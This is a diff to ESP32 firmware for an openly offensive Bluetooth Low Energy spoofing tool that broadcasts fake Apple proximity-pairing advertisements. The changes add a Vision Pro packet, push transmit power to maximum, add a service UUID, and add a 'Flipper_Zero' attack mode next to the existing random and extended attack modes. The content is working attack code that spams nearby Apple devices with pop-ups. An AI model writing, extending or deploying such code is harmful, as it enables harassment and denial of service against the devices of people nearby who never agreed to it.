@@ -13,6 +13,7 @@ BLEAdvertising *pAdvertising;
 int attack_state = 1;
 int device_choice = 0;
 int device_index = 0;
+std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";
 
 uint32_t delayMilliseconds = 1000;
 
@@ -78,6 +79,8 @@ const uint8_t SHORT_DEVICES[][23] = {
   {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
   // TV Color Balance
   {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
+  // Vision Pro
+  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
 };
 
 void setup() {
@@ -96,6 +99,9 @@ void setup() {
   Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());
 
   BLEDevice::init("AirPods 69");
+
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+
   BLEServer *pServer = BLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
 
@@ -241,10 +247,16 @@ void selectDevice(int selectedPacket) {
       TV_Color_Balance();
       break;
     case 29:
-      Random_Attack();
+      Apple_Vision_Pro();
       break;
     case 30:
+      Random_Attack();
+      break;
+    case 31:
       Extended_Attack();
+      break;
+    case 32:
+      Flipper_Zero();
       break;
     default:
       // Handle the case when selectedPacket is out of range
@@ -268,6 +280,7 @@ void loop() {
     BLEAdvertisementData oAdvertisementData = getAdvertismentData();
 
     pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+    pAdvertising->addServiceUUID(device_uuid);
     pAdvertising->setAdvertisementData(oAdvertisementData);
 
     pAdvertising->setMinInterval(0x20);
@@ -458,6 +471,12 @@ void TV_Color_Balance() {
   attack_state = 1;
 }
 
+void Apple_Vision_Pro() {
+  device_choice = 1;
+  device_index = 12;
+  attack_state = 1;
+}
+
 void Random_Attack(){
   device_choice = 2;
   attack_state = 1;
@@ -466,4 +485,10 @@ void Random_Attack(){
 void Extended_Attack(){
   device_choice = 3;
   attack_state = 1;
+}
+
+void Flipper_Zero(){
+  device_choice = 3;
+  attack_state = 1;
+  device_uuid = "00003082-0000-1000-8000-00805f9b34fb";
 }
